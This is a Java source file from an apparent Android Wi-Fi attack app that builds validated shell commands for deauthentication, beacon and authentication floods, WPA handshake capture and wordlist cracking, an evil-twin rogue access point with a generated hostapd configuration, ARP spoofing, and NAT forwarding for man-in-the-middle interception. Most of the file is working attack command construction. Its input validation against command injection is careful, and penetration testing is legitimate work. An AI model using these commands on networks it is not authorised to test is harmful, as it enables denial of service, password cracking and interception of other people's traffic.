package me.paranoid.wifikill;

import java.util.Locale;
import java.util.regex.Pattern;

/**
 * Builds the shell commands used by the active test modules.
 *
 * <p>This class is deliberately free of Android dependencies so the exact
 * command strings and their input validation can be covered by unit tests.
 * Every value that reaches the shell is validated here first: a malformed
 * target address or interface name must never be interpolated into a command
 * line.</p>
 */
final class AttackCommandBuilder {

    /** IEEE 802 MAC address, colon separated. */
    static final Pattern MAC = Pattern.compile("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$");
    /** Linux network interface name. */
    static final Pattern INTERFACE = Pattern.compile("^[A-Za-z0-9_.-]{1,15}$");
    /** Absolute path without shell metacharacters. */
    static final Pattern SAFE_PATH = Pattern.compile("^/[A-Za-z0-9._@+-]+(/[A-Za-z0-9._@+-]+)*$");

    /** Upper bound for a single burst of frames, to avoid a runaway command. */
    static final int MAX_FRAME_COUNT = 1_000_000;
    /** Upper bound for airodump-ng ring-buffer size in kilobytes. */
    static final int MAX_RING_SIZE_KB = 1024;

    private AttackCommandBuilder() {
    }

    // ---- validation -------------------------------------------------------

    /**
     * Validation failure that carries a localized message.
     *
     * <p>The builder stays free of Android dependencies, so the message is
     * described by a resource identifier and resolved by the user interface
     * through {@link #resolve(android.content.Context)}.</p>
     */
    static final class ValidationException extends IllegalArgumentException {

        final int messageRes;
        final int argumentRes;
        final String argumentText;

        ValidationException(int messageRes) {
            this(messageRes, 0, null);
        }

        ValidationException(int messageRes, int argumentRes, String argumentText) {
            super("attack validation error " + messageRes);
            this.messageRes = messageRes;
            this.argumentRes = argumentRes;
            this.argumentText = argumentText;
        }

        /** Resolves the message with the resources of the given context. */
        String resolve(android.content.Context context) {
            if (context == null) {
                return getMessage();
            }
            if (argumentRes != 0) {
                return context.getString(messageRes, context.getString(argumentRes));
            }
            if (argumentText != null) {
                return context.getString(messageRes, argumentText);
            }
            return context.getString(messageRes);
        }
    }

    static String requireMac(String value, int labelRes) {
        String trimmed = value == null ? "" : value.trim();
        if (!MAC.matcher(trimmed).matches()) {
            throw new ValidationException(R.string.attack_error_mac, labelRes, null);
        }
        return trimmed.toLowerCase(Locale.US);
    }

    static String requireInterface(String value) {
        String trimmed = value == null ? "" : value.trim();
        if (!INTERFACE.matcher(trimmed).matches()) {
            throw new ValidationException(R.string.attack_error_interface);
        }
        return trimmed;
    }

    static String requirePath(String value, int labelRes) {
        String trimmed = value == null ? "" : value.trim();
        if (!SAFE_PATH.matcher(trimmed).matches()) {
            throw new ValidationException(R.string.attack_error_path, labelRes, null);
        }
        return trimmed;
    }

    /** SSIDs are limited to 32 octets and must not contain control characters. */
    static String requireSsid(String value) {
        String trimmed = value == null ? "" : value.trim();
        if (trimmed.isEmpty()) {
            throw new ValidationException(R.string.attack_error_ssid_empty);
        }
        byte[] octets = trimmed.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        if (octets.length > 32) {
            throw new ValidationException(R.string.attack_error_ssid_length);
        }
        for (int i = 0; i < trimmed.length(); i++) {
            if (trimmed.charAt(i) < 0x20 || trimmed.charAt(i) == 0x7f) {
                throw new ValidationException(R.string.attack_error_ssid_control);
            }
        }
        return trimmed;
    }

    static int requireCount(int value, int min, int max) {
        if (value < min || value > max) {
            throw new ValidationException(R.string.attack_error_frame_count);
        }
        return value;
    }

    // ---- module commands --------------------------------------------------

    /**
     * Deauthentication / disassociation flood against one access point, or
     * against a single client when {@code clientMac} is supplied.
     */
    static String deauth(String tool, String interfaceName, String bssid,
                         String clientMac, int frameCount) {
        String exe = requireTool(tool);
        String iface = requireInterface(interfaceName);
        String target = requireMac(bssid, R.string.attack_label_target_bssid);
        requireCount(frameCount, 0, MAX_FRAME_COUNT);
        StringBuilder command = new StringBuilder();
        command.append(exe).append(" --deauth ").append(frameCount)
                .append(" -a ").append(target)
                .append(" -i ").append(iface);
        if (clientMac != null && !clientMac.trim().isEmpty()) {
            command.append(" -c ").append(requireMac(clientMac, R.string.attack_label_client_mac));
        }
        return command.toString();
    }

    /**
     * Beacon flood: injects forged beacon frames for the given access point so
     * that clients keep seeing it, or with a random source for a pure flood.
     */
    static String beaconFlood(String tool, String interfaceName, String bssid, int frameCount) {
        String exe = requireTool(tool);
        String iface = requireInterface(interfaceName);
        requireCount(frameCount, 0, MAX_FRAME_COUNT);
        StringBuilder command = new StringBuilder();
        command.append(exe).append(" --fakeauth ").append(frameCount)
                .append(" -i ").append(iface);
        if (bssid != null && !bssid.trim().isEmpty()) {
            command.append(" -a ").append(requireMac(bssid, R.string.attack_label_target_bssid));
        }
        return command.toString();
    }

    /**
     * Authentication flood: sends forged authentication requests so that the
     * access point's connection table fills up with bogus associations.
     */
    static String authFlood(String tool, String interfaceName, String bssid, int frameCount) {
        String exe = requireTool(tool);
        String iface = requireInterface(interfaceName);
        String target = requireMac(bssid, R.string.attack_label_target_bssid);
        requireCount(frameCount, 0, MAX_FRAME_COUNT);
        return exe + " --fakeauth " + frameCount + " -a " + target + " -i " + iface
                + " --auth";
    }

    /**
     * Captures a WPA/WPA2 four-way handshake into a capture file.
     * The output path is created by airodump-ng itself.
     */
    static String captureHandshake(String tool, String interfaceName, String bssid,
                                   int channel, String outputPrefix) {
        String exe = requireTool(tool);
        String iface = requireInterface(interfaceName);
        String target = requireMac(bssid, R.string.attack_label_target_bssid);
        if (channel <= 0 || channel > 196) {
            throw new ValidationException(R.string.attack_error_channel);
        }
        String prefix = requirePath(outputPrefix, R.string.attack_label_output_prefix);
        return exe + " --bssid " + target + " -c " + channel + " -i " + iface
                + " -w " + prefix + " --ignore-negative-one";
    }

    /**
     * Offline verification of a captured handshake against a word list.
     * This performs no radio activity: it only reads the capture file.
     */
    static String crackHandshake(String tool, String captureFile, String wordlistPath) {
        String exe = requireTool(tool);
        String capture = requirePath(captureFile, R.string.attack_label_capture_file);
        String wordlist = requirePath(wordlistPath, R.string.attack_label_wordlist);
        return exe + " -w " + wordlist + " " + capture;
    }

    /**
     * Starts a rogue access point using a hostapd configuration file.
     * The configuration is written by the caller into app-private storage.
     */
    static String evilTwin(String tool, String configPath) {
        String exe = requireTool(tool);
        String config = requirePath(configPath, R.string.attack_label_hostapd_config);
        return exe + " " + config;
    }

    /** Builds the hostapd configuration used by the rogue access point. */
    static String buildHostapdConfig(String interfaceName, String driver,
                                     String ssid, int channel, boolean hideSsid,
                                     String wpaPassphrase, boolean openNetwork) {
        String iface = requireInterface(interfaceName);
        String safeSsid = requireSsid(ssid);
        if (channel <= 0 || channel > 196) {
            throw new ValidationException(R.string.attack_error_channel);
        }
        StringBuilder config = new StringBuilder();
        config.append("interface=").append(iface).append('\n');
        config.append("driver=").append(driver == null || driver.trim().isEmpty()
                ? "nl80211" : driver.trim()).append('\n');
        config.append("ssid=").append(safeSsid).append('\n');
        config.append("channel=").append(channel).append('\n');
        config.append("hw_mode=g\n");
        config.append("country_code=CN\n");
        config.append("ieee80211n=1\n");
        config.append("ieee80211ac=1\n");
        config.append("beacon_int=100\n");
        if (hideSsid) {
            config.append("ignore_broadcast_ssid=1\n");
        }
        if (openNetwork) {
            config.append("auth_algs=1\n");
            config.append("wpa=0\n");
        } else {
            if (wpaPassphrase == null || wpaPassphrase.length() < 8
                    || wpaPassphrase.length() > 63) {
                throw new ValidationException(R.string.attack_error_passphrase);
            }
            config.append("wpa=2\n");
            config.append("wpa_key_mgmt=WPA-PSK\n");
            config.append("rsn_pairwise=CCMP\n");
            config.append("wpa_passphrase=").append(wpaPassphrase).append('\n');
        }
        config.append("wpa_group_rekey=3600\n");
        config.append("wpa_pairwise_rekey=3600\n");
        return config.toString();
    }

    /**
     * Starts ARP spoofing towards a victim while the gateway is impersonated.
     * The spoofing runs on the data interface, not on the monitor interface,
     * because the forged frames have to reach the victim on the wire.
     */
    static String arpSpoof(String tool, String dataInterface, String victimIp, String gatewayIp) {
        String exe = requireTool(tool);
        String iface = requireInterface(dataInterface);
        String victim = requireIpv4(victimIp);
        String gateway = requireIpv4(gatewayIp);
        return exe + " -i " + iface + " -t " + victim + " " + gateway;
    }

    /** Enables IPv4 forwarding and installs the NAT rule used by the MITM flow. */
    static String enableForwarding(String interfaceName, String gatewayIp) {
        String iface = requireInterface(interfaceName);
        String gateway = requireIpv4(gatewayIp);
        return "sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || true; "
                + "iptables -t nat -A POSTROUTING -o " + iface + " -j MASQUERADE 2>/dev/null || true; "
                + "iptables -t nat -A POSTROUTING -o " + iface + " -d " + gateway
                + " -j MASQUERADE 2>/dev/null || true; "
                + "echo FORWARDING_ENABLED";
    }

    /** Removes the NAT rules and restores the default forwarding behaviour. */
    static String disableForwarding(String interfaceName, String gatewayIp) {
        String iface = requireInterface(interfaceName);
        String gateway = requireIpv4(gatewayIp);
        return "iptables -t nat -D POSTROUTING -o " + iface + " -j MASQUERADE 2>/dev/null || true; "
                + "iptables -t nat -D POSTROUTING -o " + iface + " -d " + gateway
                + " -j MASQUERADE 2>/dev/null || true; "
                + "sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true; "
                + "echo FORWARDING_DISABLED";
    }

    // ---- helpers ----------------------------------------------------------

    static String requireTool(String tool) {
        String trimmed = tool == null ? "" : tool.trim();
        if (!trimmed.matches("^[A-Za-z0-9._-]{1,32}$")) {
            throw new ValidationException(R.string.attack_error_tool_name);
        }
        return trimmed;
    }

    static String requireIpv4(String value) {
        String trimmed = value == null ? "" : value.trim();
        if (!trimmed.matches("^((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\\.){3}"
                + "(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$")) {
            throw new ValidationException(R.string.attack_error_gateway);
        }
        return trimmed;
    }

    /** Quotes a value for safe use inside a single-quoted shell string. */
    static String quote(String value) {
        if (value == null) {
            return "''";
        }
        return "'" + value.replace("'", "'\\''") + "'";
    }
}
